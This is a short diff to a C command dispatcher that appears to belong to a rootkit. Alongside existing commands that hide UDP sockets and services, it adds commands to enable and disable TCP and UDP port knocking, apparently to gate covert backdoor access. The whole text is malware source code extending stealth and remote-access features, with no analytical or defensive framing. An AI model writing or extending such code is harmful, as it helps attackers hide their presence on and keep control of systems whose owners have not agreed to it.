@@ -92,6 +92,30 @@ execute_command (void)
 			unhide_udp_socket(port);
 		}
 		
+	} else if(strcmp(command_buffer, "enable_knocking_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			enable_knocking_tcp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "disable_knocking_tcp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			disable_knocking_tcp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "enable_knocking_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			enable_knocking_udp(port);
+		}
+		
+	} else if(strcmp(command_buffer, "disable_knocking_udp") == 0) {
+		if(param_counter > 0) {
+			port = convert_atoi(param_buffer);
+			disable_knocking_udp(port);
+		}
+		
 	} else if(strcmp(command_buffer, "hide_service") == 0) {
 		if(param_counter > 0) {
 			port = convert_atoi(param_buffer);
